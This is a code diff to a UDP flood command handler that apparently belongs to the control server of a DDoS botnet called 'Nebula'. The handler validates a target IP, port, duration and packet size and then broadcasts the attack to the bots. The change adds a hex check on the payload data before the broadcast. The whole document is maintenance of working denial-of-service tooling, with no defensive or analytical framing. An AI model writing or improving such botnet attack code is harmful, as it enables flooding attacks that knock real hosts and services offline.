@@ -1,4 +1,5 @@
 from colorama import Fore
+import re
 
 def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
     if len(args) == 5:
@@ -10,8 +11,11 @@ def udp(args, validate_ip, validate_port, validate_time, validate_size, send, cl
             if validate_port(port, True):
                 if validate_time(secs):
                     if validate_size(size):
-                        send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
-                        broadcast(data)
+                        if re.match(r'^[0-9a-fA-F]+$', data):
+                            send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTBLACK_EX}Nebula {Fore.LIGHTWHITE_EX}servers!")
+                            broadcast(data)
+                        else:
+                            send(client, Fore.RED + 'Invalid hex data')
                     else:
                         send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                 else:
